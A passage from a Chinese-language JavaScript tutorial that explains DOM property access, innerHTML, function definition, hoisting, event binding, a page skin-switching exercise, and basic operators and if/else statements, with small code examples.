属性里面的属性，有横杠的改成驼峰式，比如：“font-size”，改成”style.fontSize”</p><p>通过“.”操作属性：具体来说是操作属性的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当整个页面加载完毕之后再执行花括号里面的语句</span></span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过ID名获取元素赋值给oDiv变量</span></span><br><span class="line">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);</span><br><span class="line">        <span class="keyword">var</span> oA = <span class="built_in">document</span>.getElementById(<span class="string">"link"</span>);</span><br><span class="line">        <span class="keyword">var</span> oDiv2 = <span class="built_in">document</span>.getElementById(<span class="string">"div2"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 改变元素的属性</span></span><br><span class="line">        oDiv.style.color = <span class="string">"red"</span>;</span><br><span class="line">        oDiv.style.fontSize = <span class="string">"20px"</span>;</span><br><span class="line"></span><br><span class="line">        oA.href = <span class="string">"http://www.baidu.com"</span>;</span><br><span class="line">        oA.title = <span class="string">"这是一个百度网的链接"</span>;</span><br><span class="line"></span><br><span class="line">        oDiv2.className = <span class="string">"box2"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取元素的属性</span></span><br><span class="line">        <span class="keyword">var</span> sId = oDiv.id;</span><br><span class="line">        alert(sId)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;style type="text/</span>css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    .box&#123;</span></span><br><span class="line"><span class="string">        font-size: 20px;</span></span><br><span class="line"><span class="string">        color: gold;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .box2&#123;</span></span><br><span class="line"><span class="string">        font-size: 30px;</span></span><br><span class="line"><span class="string">        color: pink;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div id="</span>div1<span class="string">"&gt;这是一个div元素&lt;/div&gt;</span></span><br><span class="line">&lt;a href="#" id="link"&gt;这是一个链接&lt;/a&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"box"</span> id=<span class="string">"div2"</span>&gt;这是第二个div元素&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><p>通过“[ ]”操作属性：具体来说是操作属性，把属性作为变量来处理，而不是作为一个值来处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> oInput1 = <span class="built_in">document</span>.getElementById(<span class="string">'input1'</span>);</span><br><span class="line">        <span class="keyword">var</span> oInput2 = <span class="built_in">document</span>.getElementById(<span class="string">'input2'</span>);</span><br><span class="line">        <span class="keyword">var</span> oA = <span class="built_in">document</span>.getElementById(<span class="string">'link1'</span>);</span><br><span class="line">        <span class="comment">// 读取属性</span></span><br><span class="line">        <span class="keyword">var</span> sVal1 = oInput1.value;</span><br><span class="line">        <span class="keyword">var</span> sVal2 = oInput2.value;</span><br><span class="line">        <span class="comment">// 写(设置)属性</span></span><br><span class="line">        <span class="comment">// oA.style.val1 = val2; 没反应</span></span><br><span class="line">        oA.style[sVal1] = sVal2;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">......</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;input type="text" name="setattr" id="input1" value="fontSize"&gt;</span></span><br><span class="line"><span class="regexp">&lt;input type="text" name="setnum" id="input2" value="30px"&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href="http:/</span><span class="regexp">/www.baidu.com" id="link1"&gt;这是百度网站地址&lt;/</span>a&gt;</span><br></pre></td></tr></table></figure><h3 id="9-5-3-innerHTML"><a href="#9-5-3-innerHTML" class="headerlink" title="9.5.3 innerHTML"></a>9.5.3 <strong>innerHTML</strong></h3><p>innerHTML可以读取或者写入标签包裹的内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'div1'</span>);</span><br><span class="line">        <span class="comment">//读取</span></span><br><span class="line">        <span class="keyword">var</span> sTxt = oDiv.innerHTML;</span><br><span class="line">        alert(sTxt);</span><br><span class="line">        <span class="comment">//写入</span></span><br><span class="line">        oDiv.innerHTML = <span class="string">'&lt;a href="http://http://www.baidu.com"&gt;这是百度网站地址&lt;a/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">......</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;div id="div1"&gt;这是一个div元素&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><h2 id="9-6-函数"><a href="#9-6-函数" class="headerlink" title="9.6 函数"></a>9.6 函数</h2><p>函数就是重复执行的代码片。</p><h3 id="9-6-1-函数定义与执行"><a href="#9-6-1-函数定义与执行" class="headerlink" title="9.6.1 函数定义与执行"></a>9.6.1 <strong>函数定义与执行</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数的定义</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fnMyalert</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">'Hello world!'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fnChange</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);</span><br><span class="line">        oDiv.style.color = <span class="string">"red"</span>;</span><br><span class="line">        oDiv.style.fontSize = <span class="string">"30px"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//函数执行</span></span><br><span class="line">    <span class="comment">// fnChange();</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;!--标签里调用函数执行--&gt;</span></span><br><span class="line"><span class="regexp">&lt;div id="div1" onclick="fnMyalert()"&gt;这是一个div元素&lt;/</span>div&gt;</span><br><span class="line">&lt;input type=<span class="string">"button"</span> name=<span class="string">""</span> value=<span class="string">"改变div"</span> onclick=<span class="string">"fnChange()"</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="9-6-2-变量与函数预解析"><a href="#9-6-2-变量与函数预解析" class="headerlink" title="9.6.2 变量与函数预解析"></a>9.6.2 <strong>变量与函数预解析</strong></h3><p>JavaScript解析过程分为两个阶段，先是编译阶段，然后执行阶段，在编译阶段会将function定义的函数提前，并且将var定义的变量声明提前，将它赋值为undefined。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;    </span><br><span class="line">    fnAlert();       <span class="comment">// 弹出 hello！</span></span><br><span class="line">    alert(iNum);  <span class="comment">// 弹出 undefined</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fnAlert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">'hello!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> iNum = <span class="number">123</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-6-3-提取行间事件"><a href="#9-6-3-提取行间事件" class="headerlink" title="9.6.3 提取行间事件"></a>9.6.3 <strong>提取行间事件</strong></h3><p>在html行间调用的事件可以提取到javascript中调用，从而做到结构与行为分离。</p><p>说白了就是在html的标签中不含有任何关于js的代码，如下例，通过html标签中的id跟js关联起来，从而使用js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--行间事件调用函数   --&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;        </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fnAlert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">'ok!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">......</span></span><br><span class="line"><span class="regexp">&lt;input type="button" name="" value="弹出" onclick="fnAlert()"&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;!-- 提取行间事件 --&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">window.onload = function()&#123;</span></span><br><span class="line"><span class="string">    var oBtn = document.getElementById('btn1');</span></span><br><span class="line"><span class="string">    oBtn.onclick = fnAlert;</span></span><br><span class="line"><span class="string">    function fnAlert()&#123;</span></span><br><span class="line"><span class="string">        alert('ok!');</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;    </span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">&lt;input type="</span>button<span class="string">" name="</span><span class="string">" value="</span>弹出<span class="string">" id="</span>btn1<span class="string">"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-6-4-匿名函数"><a href="#9-6-4-匿名函数" class="headerlink" title="9.6.4 匿名函数"></a>9.6.4 <strong>匿名函数</strong></h3><p>定义的函数可以不给名称，这个叫做匿名函数，可以将匿名函数直接赋值给元素绑定的事件来完成匿名函数的调用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oBtn = <span class="built_in">document</span>.getElementById(<span class="string">'btn1'</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    oBtn.onclick = myalert;</span></span><br><span class="line"><span class="comment">    function myalert()&#123;</span></span><br><span class="line"><span class="comment">        alert('ok!');</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 直接将匿名函数赋值给绑定的事件</span></span><br><span class="line">    oBtn.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">'ok!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-6-5-综合练习"><a href="#9-6-5-综合练习" class="headerlink" title="9.6.5 综合练习"></a>9.6.5 <strong>综合练习</strong></h3><p>网页换肤<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/004_01.css"</span> <span class="attr">id</span>=<span class="string">"link01"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBtn01 = <span class="built_in">document</span>.getElementById(<span class="string">"btn01"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBtn02 = <span class="built_in">document</span>.getElementById(<span class="string">"btn01"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oLink = <span class="built_in">document</span>.getElementById(<span class="string">"link01"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            oBtn01.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                oLink.href = <span class="string">"css/004_01.css"</span>;</span></span><br><span class="line"><span class="undefined">            &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            oBtn02.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                oLink.href = <span class="string">"css/004_02.css"</span>;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"皮肤1"</span> <span class="attr">id</span>=<span class="string">"btn01"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"皮肤2"</span> <span class="attr">id</span>=<span class="string">"btn02"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* css/004_01.css */</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: aqua;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* css/004_02.css */</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: aqua;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-6-6-函数传参"><a href="#9-6-6-函数传参" class="headerlink" title="9.6.6 函数传参"></a>9.6.6 <strong>函数传参</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fnAlert</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">        alert(a);</span><br><span class="line">    &#125;</span><br><span class="line">    fnAlert(<span class="number">12345</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-6-7-函数’return’关键字"><a href="#9-6-7-函数’return’关键字" class="headerlink" title="9.6.7 函数’return’关键字"></a>9.6.7 <strong>函数’return’关键字</strong></h3><p>函数中’return’关键字的作用：<br>1、返回函数执行的结果<br>2、结束函数的运行<br>3、阻止默认行为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数返回值+结束函数运行</span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fnAdd</span>(<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> c = a + b;</span><br><span class="line">        alert(<span class="string">'hello-1'</span>); <span class="comment">// hello-1</span></span><br><span class="line">        <span class="comment">// 返回c的值，结束函数的运行</span></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">        <span class="comment">// 这一句不弹出</span></span><br><span class="line">        alert(<span class="string">'hello-2'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> result = fnAdd(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    alert(result); <span class="comment">// 弹出7</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 函数传参</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    window.onload = function () &#123;</span></span><br><span class="line"><span class="string">        function fnChangestyle(mystyle,val) &#123;</span></span><br><span class="line"><span class="string">            var oDiv = document.getElementById("</span>div1<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            oDiv.style[mystyle] = val;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        fnChangestyle("</span>color<span class="string">","</span>pink<span class="string">");</span></span><br><span class="line"><span class="string">        fnChangestyle("</span>fontSize<span class="string">","</span><span class="number">30</span>px<span class="string">");</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;div id="</span>div1<span class="string">"&gt;这是一个div元素&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-7-条件语句"><a href="#9-7-条件语句" class="headerlink" title="9.7 条件语句"></a>9.7 条件语句</h2><p>通过条件来控制程序的走向，就需要用到条件语句。</p><h3 id="9-7-1-运算符"><a href="#9-7-1-运算符" class="headerlink" title="9.7.1 运算符"></a>9.7.1 <strong>运算符</strong></h3><p>1、算术运算符： +(加)、 -(减)、 <em>(乘)、 /(除)、 %(求余数)<br>2、赋值运算符：=、 +=、 -=、 </em>=、 /=、 %=<br>3、条件运算符：<code>==</code>、<code>===</code>、&gt;、&gt;=、&lt;、&lt;=、!=、&amp;&amp;(而且)、||(或者)、!(否)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oInput01 = <span class="built_in">document</span>.getElementById(<span class="string">"input01"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oInput02 = <span class="built_in">document</span>.getElementById(<span class="string">"input02"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oBtn = <span class="built_in">document</span>.getElementById(<span class="string">"btn"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        oBtn.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// parseInt()函数转换成数字</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iVal01 = <span class="built_in">parseInt</span>(oInput01.value);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iVal02 = <span class="built_in">parseInt</span>(oInput02.value);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iBtn = iVal01 + iVal02;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">            alert(iBtn);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"input01"</span>&gt;</span> +</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"input02"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"相加"</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-7-2-if-else"><a href="#9-7-2-if-else" class="headerlink" title="9.7.2 if else"></a>9.7.2 <strong>if else</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> iNum01 = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">var</span> iNum02 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">var</span> sTr;</span><br><span class="line">    <span class="keyword">if</span> (iNum01 &gt; iNum02) &#123;</span><br><span class="line">        sTr = <span class="string">'大于'</span>;</span><br><span class="line">    &#125; <span 